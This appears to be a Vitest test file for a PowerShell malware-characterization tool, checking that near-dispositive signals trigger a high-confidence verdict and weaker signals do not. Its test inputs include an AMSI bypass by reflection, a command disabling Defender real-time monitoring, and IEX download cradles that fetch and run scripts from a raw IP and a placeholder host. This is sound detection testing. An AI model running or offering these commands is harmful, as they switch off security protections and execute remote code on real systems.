import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('specificity-gated characterization', () => {
  it('emits a high-confidence characterization when a near-dispositive signal fires', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.characterization).not.toBeNull()
    expect(r.characterization!.level).toBe('high-confidence-malicious')
    expect(r.characterization!.basis).toContain('amsi-reflection')
    // read is built ONLY from near-dispositive signals in basis.
    expect(r.characterization!.read).toMatch(/AMSI bypass via reflection/)
  })

  it('read contains only names present in basis (no strong/weak signal leaks in)', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); Set-MpPreference -DisableRealtimeMonitoring $true")
    // Defender tamper is STRONG — its label must NOT appear in the read.
    expect(r.characterization!.read).not.toMatch(/Defender tampering/)
  })

  it('strong-only patterns yield NO characterization (anti-cry-wolf)', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
    expect(r.characterization).toBeNull()
  })

  it('benign-twin (download to file) yields no signals and no characterization', async () => {
    const r = await analyze("Invoke-WebRequest https://example.com/data.json -OutFile data.json")
    expect(r.characterization).toBeNull()
    expect(r.signals.find((s) => s.id === 'download-cradle')).toBeUndefined()
  })
})
